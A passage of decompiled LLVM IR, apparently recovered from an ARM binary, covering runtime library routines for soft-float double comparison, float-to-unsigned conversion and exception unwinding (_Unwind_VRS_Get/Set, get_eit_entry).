  %v4_182e8.pre-phi = phi i32 [ %.pre80, %dec_label_pc_182d4._crit_edge ], [ %v5_182d8, %bb111 ]
  %v0_182dc = phi i1 [ false, %dec_label_pc_182d4._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_182dc, i32 ptrtoint (i32* @global_var_18004.964 to i32))
  %v0_182e0 = load i32, i32* @r0, align 4
  %v1_182e0 = load i32, i32* @r1, align 4
  %v3_182e0 = mul i32 %v1_182e0, 2
  %v4_182e0 = or i32 %v3_182e0, %v0_182e0
  store i32 %v4_182e0, i32* %r4.global-to-local, align 4
  %v1_182e4 = icmp ne i32 %v4_182e0, 0
  call void @__pseudo_cond_branch(i1 %v1_182e4, i32 ptrtoint (i32* @global_var_180bc.962 to i32))
  store i32 %v4_182e8.pre-phi, i32* %r5.global-to-local, align 4
  %v1_182ec = icmp ne i32 %v4_182e8.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_182ec, i32 ptrtoint (i32* @global_var_1806c.963 to i32))
  %v0_182f0 = load i32, i32* @r0, align 4
  %v1_182f0 = load i32, i32* @r1, align 4
  %v2_182f0 = call i32 @function_180d8(i32 %v0_182f0, i32 %v1_182f0)
  store i32 %v2_182f0, i32* %r0.global-to-local, align 4
  ret i32 %v2_182f0

; uselistorder directives
  uselistorder i32 %v5_182d8, { 1, 0, 2 }
  uselistorder i32 %v1_18294, { 1, 0 }
  uselistorder i32 %v1_18274, { 1, 0 }
  uselistorder i32 %v0_18274, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1825c, { 2, 0, 1 }
  uselistorder i32 %v6_18258, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_18250, { 1, 0 }
  uselistorder i32 %v2_18238, { 1, 0, 2 }
  uselistorder i32 %v1_18238, { 1, 0, 2 }
  uselistorder i32 %v1_18234, { 1, 0, 2 }
  uselistorder i32 %v0_18234, { 1, 0, 2 }
  uselistorder i1 %v7_18228, { 1, 0 }
  uselistorder i32 %v2_1820c, { 1, 0 }
  uselistorder i32 %v3_181f8, { 2, 1, 0 }
  uselistorder i32 %v3_181ec, { 0, 2, 1 }
  uselistorder i32 %v5_181e8, { 2, 0, 1 }
  uselistorder i32 %v6_181d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_181c4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_181c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_181cc, { 0, 2, 1 }
  uselistorder i32 %v1_181d8, { 1, 0 }
  uselistorder i32 %v6_181bc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_181a8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_181a4, { 0, 2, 1 }
  uselistorder i32 %v0_181b0, { 0, 2, 1 }
  uselistorder i32 %v1_181bc, { 1, 0 }
  uselistorder i32 %v6_181a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1818c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18194, { 0, 2, 1 }
  uselistorder i32 %v1_181a0, { 1, 0 }
  uselistorder i32 %v3_18184, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_18178, { 1, 2, 0 }
  uselistorder i32 %v3_181f813, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_181f417, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_18178, { 0, 3, 2, 1 }
  uselistorder i32 %v1_18184, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_18220.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_18164, { 1, 0 }
  uselistorder i32 %v0_18168, { 1, 0 }
  uselistorder i32 %v3_18154, { 1, 0 }
  uselistorder i1 %v1_18148, { 1, 0 }
  uselistorder i32 %v3_18138, { 2, 3, 1, 0 }
  uselistorder i32 %v5_18134, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1812c, { 2, 1, 0 }
  uselistorder i32 %v5_18128, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18108, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_180f8, { 2, 3, 1, 0 }
  uselistorder i32 %v5_180f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_180f4, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_180f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_180e8, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 0, 6, 7, 1, 2, 3, 4, 5, 8 }
  uselistorder i32* %ip.global-to-local, { 9, 6, 7, 8, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_180d8, { 2, 1, 0 }
  uselistorder i32 ()* @function_17f44, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* @cpsr_v, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 1024, { 3, 0, 14, 1, 15, 4, 16, 2, 11, 12, 13, 5, 6, 7, 9, 10, 8 }
  uselistorder i32 1792, { 1, 2, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 33, { 3, 4, 5, 1, 6, 7, 2, 0 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 4, 5, 0, 6, 7, 2, 3, 8, 9 }
  uselistorder i32 1048576, { 22, 0, 1, 2, 23, 24, 13, 3, 4, 5, 25, 6, 7, 26, 27, 16, 17, 8, 9, 28, 29, 30, 19, 31, 10, 14, 11, 18, 12, 20, 15, 21 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_182d4, { 1, 0 }
  uselistorder label %dec_label_pc_182b8, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_18284, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_18174, { 1, 0 }
  uselistorder label %dec_label_pc_1815c, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_182f8 = call i32 @function_18308()
  ret i32 %v0_182f8
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_18300 = call i32 @function_18308()
  ret i32 %v0_18300

; uselistorder directives
  uselistorder i32 ()* @function_18308, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_18304 = load i32, i32* @r0, align 4
  ret i32 %v0_18304
}

define i32 @function_18308() local_unnamed_addr {
dec_label_pc_18308:
  %v0_18308 = load i32, i32* @ip, align 4
  %v0_1830c = load i32, i32* @r1, align 4
  %v2_1830c = mul i32 %v0_1830c, 2
  %v2_1830c.off = add i32 %v2_1830c, 4194303
  %tmp = icmp ult i32 %v2_1830c.off, 2097152
  %v0_18314 = load i32, i32* @r3, align 4
  %v2_18314 = mul i32 %v0_18314, 2
  br i1 %tmp, label %dec_label_pc_18364, label %bb

bb:                                               ; preds = %dec_label_pc_18308
  %v2_18314.off = add i32 %v2_18314, 4194303
  %tmp21 = icmp ult i32 %v2_18314.off, 2097152
  br i1 %tmp21, label %dec_label_pc_18358, label %dec_label_pc_18320

dec_label_pc_18320:                               ; preds = %dec_label_pc_1836c, %dec_label_pc_18378, %bb
  %v0_18320 = load i32, i32* @r0, align 4
  %v4_18320 = or i32 %v0_18320, %v2_1830c
  %v6_18320 = icmp eq i32 %v4_18320, 0
  br i1 %v6_18320, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_18320
  %v1_18324 = load i32, i32* @r2, align 4
  %v5_18324 = or i32 %v1_18324, %v2_18314
  %v7_18324 = icmp eq i32 %v5_18324, 0
  br i1 %v7_18324, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_18320, %bb10
  %v5_18328 = icmp eq i32 %v0_18314, %v0_1830c
  br i1 %v5_18328, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1832c.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1832c = phi i32 [ %v2_1832c.pre, %.thread..thread1_crit_edge ], [ %v1_18324, %bb10 ]
  %v5_1832c = icmp eq i32 %v2_1832c, %v0_18320
  br i1 %v5_1832c, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_18334 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_18334 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_18334, i32 %v0_18334)
  %v0_18338 = load i32, i32* @r0, align 4
  %v0_1833c = load i32, i32* @r1, align 4
  %v1_1833c = load i32, i32* @r3, align 4
  %v2_1833c = xor i32 %v1_1833c, %v0_1833c
  %v3_1833c = icmp slt i32 %v2_1833c, 0
  br i1 %v3_1833c, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_18340 = icmp eq i32 %v0_1833c, %v1_1833c
  br i1 %v10_18340, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_18344 = load i32, i32* @r2, align 4
  %v4_18344 = icmp ult i32 %v0_18338, %v2_18344
  br i1 %v4_18344, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_18340 = icmp ult i32 %v0_1833c, %v1_1833c
  br i1 %v4_18340, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1833c, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_18348 = and i32 %v1_1833c, 1073741824
  %v3_18348 = icmp eq i32 %v2_18348, 0
  %v4_18348 = ashr i32 %v1_1833c, 31
  br i1 %v3_18348, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1834c.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_18348, %bb15 ]
  %v5_1834c = sub nsw i32 -1, %v4_1834c.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_18350 = phi i32 [ %v4_18348, %bb15 ], [ %v5_1834c, %.thread3 ]
  %v1_18350 = or i32 %v0_18350, 1
  ret i32 %v1_18350

dec_label_pc_18358:                               ; preds = %bb
  br label %dec_label_pc_1836c

dec_label_pc_18364:                               ; preds = %dec_label_pc_18308
  %v0_18364 = load i32, i32* @r0, align 4
  %v4_18364 = mul i32 %v0_1830c, 4096
  %v5_18364 = or i32 %v0_18364, %v4_18364
  %v7_18364 = icmp eq i32 %v5_18364, 0
  br i1 %v7_18364, label %dec_label_pc_18364.dec_label_pc_1836c_crit_edge, label %dec_label_pc_18380

dec_label_pc_18364.dec_label_pc_1836c_crit_edge:  ; preds = %dec_label_pc_18364
  %v2_18314.off20 = add i32 %v2_18314, 4194303
  %tmp22 = icmp ult i32 %v2_18314.off20, 2097152
  br label %dec_label_pc_1836c

dec_label_pc_1836c:                               ; preds = %dec_label_pc_18364.dec_label_pc_1836c_crit_edge, %dec_label_pc_18358
  %v3_18370.pre-phi = phi i1 [ %tmp22, %dec_label_pc_18364.dec_label_pc_1836c_crit_edge ], [ true, %dec_label_pc_18358 ]
  br i1 %v3_18370.pre-phi, label %dec_label_pc_18378, label %dec_label_pc_18320

dec_label_pc_18378:                               ; preds = %dec_label_pc_1836c
  %v0_18378 = load i32, i32* @r2, align 4
  %v4_18378 = mul i32 %v0_18314, 4096
  %v5_18378 = or i32 %v0_18378, %v4_18378
  %v7_18378 = icmp eq i32 %v5_18378, 0
  br i1 %v7_18378, label %dec_label_pc_18320, label %dec_label_pc_18380

dec_label_pc_18380:                               ; preds = %dec_label_pc_18364, %dec_label_pc_18378
  ret i32 %v0_18308

; uselistorder directives
  uselistorder i32 %v4_18348, { 1, 0 }
  uselistorder i32 %v1_1833c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1833c, { 2, 1, 0 }
  uselistorder i32 %v1_18324, { 1, 0 }
  uselistorder i32 %v2_18314, { 0, 2, 1 }
  uselistorder i32 %v0_18314, { 1, 0, 2 }
  uselistorder i32 %v2_1830c, { 1, 0 }
  uselistorder i32 %v0_1830c, { 1, 0, 2 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 11, 12, 7, 8, 1, 14, 0, 15, 16, 17, 18, 13 }
  uselistorder label %dec_label_pc_18380, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_18320, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_18388 = load i32, i32* @r0, align 4
  %v0_1838c = load i32, i32* @r2, align 4
  store i32 %v0_1838c, i32* @r0, align 4
  store i32 %v0_18388, i32* @r2, align 4
  %v0_183a0 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_183a0
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_183a4 = load i32, i32* @r0, align 4
  %v1_183a8 = sext i32 %v3_183a4 to i64
  %v2_183a8 = bitcast i64 %v1_183a8 to double
  %v3_183a8 = load i32, i32* @r2, align 4
  %v4_183a8 = sext i32 %v3_183a8 to i64
  %v5_183a8 = bitcast i64 %v4_183a8 to double
  %v7_183a8 = fcmp oeq double %v2_183a8, %v5_183a8
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_183a8 = fcmp ule double %v2_183a8, %v5_183a8
  %not.v7_183a8 = xor i1 %v7_183a8, true
  %v1_183ac = and i1 %not.v6_183a8, %not.v7_183a8
  store i1 %v7_183a8, i1* @cpsr_z, align 1
  br i1 %v1_183ac, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_183a8, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_183a4

; uselistorder directives
  uselistorder i1 %v7_183a8, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_183c0 = call i32 @__aeabi_cdcmple()
  %v0_183c4 = load i1, i1* @cpsr_z, align 1
  %.v0_183c0. = zext i1 %v0_183c4 to i32
  ret i32 %.v0_183c0.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_183d8 = call i32 @__aeabi_cdcmple()
  %v0_183dc = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_183dc to i32
  %.v0_183d8. = xor i32 %tmp2, 1
  ret i32 %.v0_183d8.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_183f0 = call i32 @__aeabi_cdcmple()
  %v0_183f4 = load i1, i1* @cpsr_z, align 1
  %v1_183f4 = load i1, i1* @cpsr_c, align 1
  %v2_183f4 = xor i1 %v1_183f4, true
  %v3_183f4 = or i1 %v0_183f4, %v2_183f4
  %.v0_183f0 = select i1 %v3_183f4, i32 1, i32 %v0_183f0
  %v2_183f8 = xor i1 %v0_183f4, true
  %v3_183f8 = and i1 %v1_183f4, %v2_183f8
  %..v0_183f0 = select i1 %v3_183f8, i32 0, i32 %.v0_183f0
  ret i32 %..v0_183f0

; uselistorder directives
  uselistorder i1 %v1_183f4, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_18404 = load i32, i32* @lr, align 4
  store i32 %v0_18404, i32* %stack_var_-8, align 4
  %v0_18408 = call i32 @__aeabi_cdrcmple()
  %v0_1840c = load i1, i1* @cpsr_z, align 1
  %v1_1840c = load i1, i1* @cpsr_c, align 1
  %v2_1840c = xor i1 %v1_1840c, true
  %v3_1840c = or i1 %v0_1840c, %v2_1840c
  %.v0_18408 = select i1 %v3_1840c, i32 1, i32 %v0_18408
  %v2_18410 = xor i1 %v0_1840c, true
  %v3_18410 = and i1 %v1_1840c, %v2_18410
  %..v0_18408 = select i1 %v3_18410, i32 0, i32 %.v0_18408
  %v2_18414 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18414, i32* @lr, align 4
  ret i32 %..v0_18408

; uselistorder directives
  uselistorder i1 %v1_1840c, { 1, 0 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_18420 = call i32 @__aeabi_cdrcmple()
  %v0_18424 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_18424 to i32
  %.v0_18420. = xor i32 %tmp2, 1
  ret i32 %.v0_18420.

; uselistorder directives
  uselistorder i1* @cpsr_c, { 0, 6, 1, 7, 8, 9, 2, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_18434 = icmp slt i32 %arg2, 0
  %v2_18434 = mul i32 %arg2, 2
  br i1 %v1_18434, label %dec_label_pc_18468, label %dec_label_pc_1843c

dec_label_pc_1843c:                               ; preds = %entry
  %v1_1843c = add i32 %v2_18434, 2097152
  %v2_1843c = icmp ugt i32 %v2_18434, -2097153
  br i1 %v2_1843c, label %dec_label_pc_18470, label %dec_label_pc_18444

dec_label_pc_18444:                               ; preds = %dec_label_pc_1843c
  %v6_1843c = icmp slt i32 %v1_1843c, 0
  br i1 %v6_1843c, label %dec_label_pc_18448, label %dec_label_pc_18468

dec_label_pc_18448:                               ; preds = %dec_label_pc_18444
  %v4_1844c = sdiv i32 %v1_1843c, 2097152
  %v5_1844c = sub nsw i32 -993, %v4_1844c
  %v11_1844c = icmp slt i32 %v5_1844c, 0
  br i1 %v11_1844c, label %dec_label_pc_18478, label %dec_label_pc_18454

dec_label_pc_18454:                               ; preds = %dec_label_pc_18448
  %v3_18454 = mul i32 %arg2, 2048
  %v4_1845c = udiv i32 %arg1, 2097152
  %v1_18458 = or i32 %v4_1845c, %v3_18454
  %v5_1845c = or i32 %v1_18458, -2147483648
  %v6_18460 = lshr i32 %v5_1845c, %v5_1844c
  ret i32 %v6_18460

dec_label_pc_18468:                               ; preds = %dec_label_pc_18444, %entry
  ret i32 0

dec_label_pc_18470:                               ; preds = %dec_label_pc_1843c
  %v4_18470 = mul i32 %arg2, 4096
  %v5_18470 = or i32 %v4_18470, %arg1
  %v7_18470 = icmp eq i32 %v5_18470, 0
  br i1 %v7_18470, label %dec_label_pc_18478, label %dec_label_pc_18480

dec_label_pc_18478:                               ; preds = %dec_label_pc_18470, %dec_label_pc_18448
  ret i32 -1

dec_label_pc_18480:                               ; preds = %dec_label_pc_18470
  ret i32 0

; uselistorder directives
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_18488 = icmp eq i32 %regclass, 0
  br i1 %v2_18488, label %dec_label_pc_18490, label %dec_label_pc_184c0

dec_label_pc_18490:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_18490
  %v6_18494 = icmp eq i32 %representation, 0
  br i1 %v6_18494, label %dec_label_pc_184a4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_18490
  br label %dec_label_pc_184cc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_184cc

dec_label_pc_184a4:                               ; preds = %bb
  %v3_184a4 = mul i32 %regno, 4
  %v2_184a8 = add i32 %v3_184a4, %context
  %v1_184ac = add i32 %v2_184a8, 4
  %v2_184ac = inttoptr i32 %v1_184ac to i32*
  %v3_184ac = load i32, i32* %v2_184ac, align 4
  %v2_184b8 = bitcast i8* %valuep to i32*
  store i32 %v3_184ac, i32* %v2_184b8, align 4
  ret i32 0

dec_label_pc_184c0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_184c0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_184c0, %bb9
  %v0_184c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_184c8)
  br label %dec_label_pc_184cc

dec_label_pc_184cc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_184cc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_184d4 = icmp eq i32 %regclass, 0
  br i1 %v2_184d4, label %dec_label_pc_184dc, label %dec_label_pc_1850c

dec_label_pc_184dc:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_184dc
  %v6_184e0 = icmp eq i32 %representation, 0
  br i1 %v6_184e0, label %dec_label_pc_184f0, label %bb8

.thread3:                                         ; preds = %dec_label_pc_184dc
  br label %dec_label_pc_18518

bb8:                                              ; preds = %bb
  br label %dec_label_pc_18518

dec_label_pc_184f0:                               ; preds = %bb
  %v3_184f4 = mul i32 %regno, 4
  %v1_184f8 = bitcast i8* %valuep to i32*
  %v2_184f8 = load i32, i32* %v1_184f8, align 4
  %v2_184fc = add i32 %v3_184f4, %context
  %v2_18504 = add i32 %v2_184fc, 4
  %v3_18504 = inttoptr i32 %v2_18504 to i32*
  store i32 %v2_184f8, i32* %v3_18504, align 4
  ret i32 0

dec_label_pc_1850c:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1850c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1850c, %bb9
  %v0_18514 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18514)
  br label %dec_label_pc_18518

dec_label_pc_18518:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_18518, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_18520 = add i32 %context, 68
  %v2_18520 = inttoptr i32 %v1_18520 to i32*
  %v3_18520 = load i32, i32* %v2_18520, align 4
  ret i32 %v3_18520

; uselistorder directives
  uselistorder i32 68, { 32, 0, 30, 1, 3, 7, 4, 8, 5, 9, 6, 10, 11, 12, 20, 21, 19, 22, 23, 24, 25, 26, 27, 14, 15, 16, 17, 13, 18, 2, 28, 29, 31 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_18530 = add i32 %exc, 8
  %v2_18530 = inttoptr i32 %v1_18530 to i32*
  %v3_18530 = load i32, i32* %v2_18530, align 4
  %v2_18534 = icmp eq i32 %v3_18530, 0
  br i1 %v2_18534, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_18548 = xor i1 %v2_18534, true
  call void @__pseudo_cond_branch(i1 %v2_18548, i32 %v3_18530)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18560 = call i32 @abort()
  ret i32 %v0_18560
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_1856c = call i32 @abort()
  ret i32 %v0_1856c
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18570 = load i32, i32* @r4, align 4
  store i32 %v3_18570, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r5.global-to-local, align 4
  %v4_18580 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 140) to i32*), align 4
  %v2_18584 = icmp eq i32 %v4_18580, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_18590 = add i32 %return_address, -2
  store i32 %v1_18590, i32* %r4.global-to-local, align 4
  br i1 %v2_18584, label %dec_label_pc_185c8, label %dec_label_pc_18598

dec_label_pc_18598:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18580)
  %v2_185a8 = icmp eq i32 %v1_18590, 0
  br i1 %v2_185a8, label %.thread, label %dec_label_pc_185e8thread-pre-split

.thread:                                          ; preds = %dec_label_pc_18598
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_185b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_185b0 = add i32 %v2_185b0, 16
  %v4_185b0 = inttoptr i32 %v3_185b0 to i32*
  store i32 0, i32* %v4_185b0, align 4
  br label %dec_label_pc_185b8

dec_label_pc_185b8:                               ; preds = %.thread, %.thread10, %dec_label_pc_18760, %dec_label_pc_1874c, %dec_label_pc_18728, %dec_label_pc_18700, %dec_label_pc_18600
  %v0_185b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_185c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_185c0, i32* @r4, align 4
  ret i32 %v0_185b8

dec_label_pc_185c8:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_185d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 20) to i32*), align 4
  %v4_185d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 52) to i32*), align 4
  store i32 %v4_185d4, i32* %r2.global-to-local, align 4
  %v2_185d8 = sub i32 %v4_185d0, %v4_185d4
  %v3_185dc = sdiv i32 %v2_185d8, 8
  store i32 %v3_185dc, i32* %stack_var_-36, align 4
  br label %dec_label_pc_185e8

dec_label_pc_185e8thread-pre-split:               ; preds = %dec_label_pc_18598
  %v3_185e8.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_185e8

dec_label_pc_185e8:                               ; preds = %dec_label_pc_185e8thread-pre-split, %dec_label_pc_185c8
  %v0_1862c.pre = phi i32 [ %v1_18590, %dec_label_pc_185e8thread-pre-split ], [ %v4_185d4, %dec_label_pc_185c8 ]
  %v1_185f0 = phi i32 [ %v3_185e8.pr, %dec_label_pc_185e8thread-pre-split ], [ %v3_185dc, %dec_label_pc_185c8 ]
  %v2_185ec = icmp eq i32 %v1_185f0, 0
  br i1 %v2_185ec, label %dec_label_pc_18600, label %dec_label_pc_1861c.preheader

dec_label_pc_1861c.preheader:                     ; preds = %dec_label_pc_185e8
  %v2_185f0 = add i32 %v1_185f0, -1
  %v1_1864c = add i32 %v0_1862c.pre, 8
  br label %dec_label_pc_1861c.outer

dec_label_pc_18600.loopexit:                      ; preds = %dec_label_pc_18678
  br label %dec_label_pc_18600

dec_label_pc_18600:                               ; preds = %dec_label_pc_18600.loopexit, %dec_label_pc_185e8, %dec_label_pc_18744
